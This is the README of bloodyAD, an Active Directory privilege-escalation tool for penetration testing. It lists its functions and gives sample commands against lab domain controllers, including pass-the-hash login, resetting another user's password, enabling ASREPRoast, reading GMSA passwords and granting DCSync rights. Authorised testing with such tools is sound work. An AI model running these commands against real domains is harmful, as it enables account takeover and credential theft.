> :warning: autobloody has been moved to its own [repo](https://github.com/CravateRouge/autobloody)  
# ![bloodyAD logo](https://repository-images.githubusercontent.com/415977068/9b2fed72-35fb-4faa-a8d3-b120cd3c396f) bloodyAD 
`bloodyAD.py` is an Active Directory privilege escalation swiss army knife

## Description
This tool can perform specific LDAP/SAMR calls to a domain controller in order to perform AD privesc.

`bloodyAD` supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc.

It is designed to be used transparently with a SOCKS proxy.

## Requirements
The following are required:
- Python 3
- DSinternals
- Impacket
- Ldap3

Use the requirements.txt for your virtual environment: `pip3 install -r requirements.txt`

## Usage
Simple usage:
```ps1
python bloodyAD.py --host 172.16.1.15 -d bloody.local -u jane.doe -p :70016778cb0524c799ac25b439bd6a31 changePassword john.doe 'Password123!'
```

**Note:** You can find more examples on https://cravaterouge.github.io/

List of all available functions:
```ps1
[bloodyAD]$ python bloodyAD.py -h
usage: bloodyAD.py [-h] [-d DOMAIN] [-u USERNAME] [-p PASSWORD] [-k] [-c CERTIFICATE] [-s] [--host HOST]
                   {getObjectAttributes,setAttribute,addUser,addComputer,delObject,changePassword,addObjectToGroup,addForeignObjectToGroup,delObjectFromGroup,getChildObjects,setShadowCredentials,setGenericAll,setOwner,setRbcd,setDCSync,setUserAccountControl}
                   ...

AD Privesc Swiss Army Knife

Main options:
  -h, --help            show this help message and exit
  -d DOMAIN, --domain DOMAIN
                        Domain used for NTLM authentication
  -u USERNAME, --username USERNAME
                        Username used for NTLM authentication
  -p PASSWORD, --password PASSWORD
                        Cleartext password or LMHASH:NTHASH for NTLM authentication
  -k, --kerberos
  -c CERTIFICATE, --certificate CERTIFICATE
                        Certificate authentication, e.g: "path/to/key:path/to/cert"
  -s, --secure          Try to use LDAP over TLS aka LDAPS (default is LDAP)
  --host HOST           Hostname or IP of the DC (ex: my.dc.local or 172.16.1.3)

Commands:
  {getObjectAttributes,setAttribute,addUser,addComputer,delObject,changePassword,addObjectToGroup,addForeignObjectToGroup,delObjectFromGroup,getChildObjects,setShadowCredentials,setGenericAll,setOwner,setRbcd,setDCSync,setUserAccountControl}
                        Function to call
```

Help text to use a specific function:
```ps1
[bloodyAD]$ python bloodyAD.py --host 172.16.1.15 -d bloody.local -u jane.doe -p :70016778cb0524c799ac25b439bd6a31 changePassword -h
usage: 
    Change the target password without knowing the old one using LDAPS or RPC
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
        new_pass: new password for the target
    
       [-h] [func_args ...]

positional arguments:
  func_args

optional arguments:
  -h, --help  show this help message and exit
  ```

## How it works
bloodyAD communicates with a DC using mainly the LDAP protocol in order to get information or add/modify/delete AD objects. ~~A password cannot be updated with LDAP, it must be a secure connection that is LDAPS or SAMR. A DC doesn't have LDAPS activated by default because it must be configured (with a certificate) so SAMR is used in those cases.~~ Exchange of sensitive information such as passwords are now supported using cleartext LDAP.

## Useful commands
```ps1
# Get group members
python bloodyAD.py -u john.doe -d bloody -p Password512! --host 192.168.10.2 getObjectAttributes Users member 

# Get minimum password length policy
python bloodyAD.py -u john.doe -d bloody -p Password512! --host 192.168.10.2 getObjectAttributes 'DC=bloody,DC=local' minPwdLength

# Get AD functional level
python bloodyAD.py -u Administrator -d bloody -p Password512! --host 192.168.10.2 getObjectAttributes 'DC=bloody,DC=local' msDS-Behavior-Version

# Get all users of the domain
python bloodyAD.py -u john.doe -d bloody -p Password512! --host 192.168.10.2 getChildObjects 'DC=bloody,DC=local' user

# Get all computers of the domain
python bloodyAD.py -u john.doe -d bloody -p Password512! --host 192.168.10.2 getChildObjects 'DC=bloody,DC=local' computer

# Get all containers of the domain
python bloodyAD.py -u john.doe -d bloody -p Password512! --host 192.168.10.2 getChildObjects 'DC=bloody,DC=local' container

# Enable DONT_REQ_PREAUTH for ASREPRoast
python bloodyAD.py -u Administrator -d bloody -p Password512! --host 192.168.10.2 setUserAccountControl john.doe 0x400000

# Disable ACCOUNTDISABLE
python bloodyAD.py -u Administrator -d bloody -p Password512! --host 192.168.10.2 setUserAccountControl john.doe 0x0002 False

# Get UserAccountControl flags
python bloodyAD.py -u Administrator -d bloody -p Password512! --host 192.168.10.2 getObjectAttributes john.doe userAccountControl

# Read GMSA account password
python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes gmsaAccount$ msDS-ManagedPassword
```